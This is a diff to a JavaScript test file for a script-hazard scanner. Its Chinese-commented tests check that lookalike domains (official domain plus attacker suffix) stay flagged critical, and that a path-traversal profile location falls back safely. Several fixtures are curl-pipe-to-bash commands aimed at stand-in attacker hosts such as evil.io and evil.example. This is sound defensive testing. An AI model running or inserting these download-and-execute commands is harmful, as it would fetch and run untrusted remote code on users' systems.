@@ -1461,6 +1461,22 @@ function mockFetchCapture(payload, status = 200) {
   const evilHit = await lib.scanScriptHazards(mkHaz("evil2.sh",
     "curl -s https://evil.example/x.sh | bash"));
   check("非白名单域名保持 critical", evilHit[0].severity, "critical");
+  // 白名单边界锚定（自审 H1）：后缀攻击域（官方域.攻击者域）不是官方域——
+  // 子串匹配会误降级 medium，弱提示真实攻击面
+  const suffixAttack = await lib.scanScriptHazards(mkHaz("suffix.sh",
+    "curl -s https://raw.githubusercontent.com.evil.io/x.sh | bash"));
+  check("白名单后缀攻击域保持 critical", suffixAttack[0].severity, "critical");
+  const prefixSuffix = await lib.scanScriptHazards(mkHaz("prefix-suffix.sh",
+    "curl -s https://attacker-raw.githubusercontent.com.evil.io/x | sh"));
+  check("白名单前缀+后缀攻击域保持 critical", prefixSuffix[0].severity, "critical");
+  // 合法子域仍放行降级
+  const subDomain = await lib.scanScriptHazards(mkHaz("sub.sh",
+    "curl -sL https://mirror.raw.githubusercontent.com/user/setup.sh | bash"));
+  check("白名单合法子域仍降级", [subDomain[0].category, subDomain[0].severity], ["downloadExec", "medium"]);
+  // 官方域作为攻击者域的前缀（官方域.example.com）同样不降级——可信后缀才是判定锚
+  const suffixOnly = await lib.scanScriptHazards(mkHaz("suffix-only.sh",
+    "curl -sL https://raw.githubusercontent.com.example.com/setup.sh | bash"));
+  check("官方域作前缀的攻击域保持 critical", suffixOnly[0].severity, "critical");
 
   // lifecycle 联合检测（package.json 恶意 JS 模式）
   const lcDir = join(process.env.DSH_HOME, "lifecycle-fixtures");
@@ -1622,6 +1638,33 @@ function mockFetchCapture(payload, status = 200) {
 
   // 9. CLI 指令 npm 等价回退纯函数（issue #54 archify 教训）
   check("isNpmCliTarget scope 包带版本", lib.isNpmCliTarget("@tt-a1i/archify-dsh@0.1.0"), true);
+  // 跨 profile 锚点定位（自审 H5）：resolveRecordNodeModules 按记录 location 定位真实落点
+  {
+    const profilesRoot = join(process.env.DSH_HOME, "profiles");
+    const webNm = join(profilesRoot, "web", "node_modules");
+    const legacyNm = join(profilesRoot, "legacy", "node_modules");
+    mkdirSync(join(legacyNm, "old-plugin"), { recursive: true });
+    lib.setTargetProfile("desktop");
+    try {
+      // location 在其他 profile 内 → 返回那个 profile 的 node_modules
+      check("锚点：legacy profile 记录定位到 legacy NM",
+        lib.resolveRecordNodeModules({ location: join(legacyNm, "old-plugin") }), legacyNm);
+      // 无 location → 回退当前 PROFILE_NM
+      check("锚点：无 location 回退当前 NM",
+        lib.resolveRecordNodesModules === undefined ? lib.resolveRecordNodeModules({}) : lib.resolveRecordNodeModules({}),
+        join(profilesRoot, "desktop", "node_modules"));
+      // location 在当前 profile 内 → 当前 NM
+      check("锚点：当前 profile 记录返回当前 NM",
+        lib.resolveRecordNodeModules({ location: join(join(profilesRoot, "desktop", "node_modules"), "p") }),
+        join(profilesRoot, "desktop", "node_modules"));
+      // 非法 profile 名（穿越形态）不解析——回退当前 NM
+      check("锚点：非法 profile 名回退",
+        lib.resolveRecordNodeModules({ location: join(profilesRoot, "..", "evil", "node_modules", "x") }),
+        join(profilesRoot, "desktop", "node_modules"));
+    } finally {
+      lib.setTargetProfile("web");
+    }
+  }
   check("isNpmCliTarget 裸包名", lib.isNpmCliTarget("dsh-web-ui-all"), true);
   check("isNpmCliTarget owner/name 仓库形态", lib.isNpmCliTarget("tt-a1i/archify"), false);
   check("isNpmCliTarget 空/非法", lib.isNpmCliTarget(""), false);
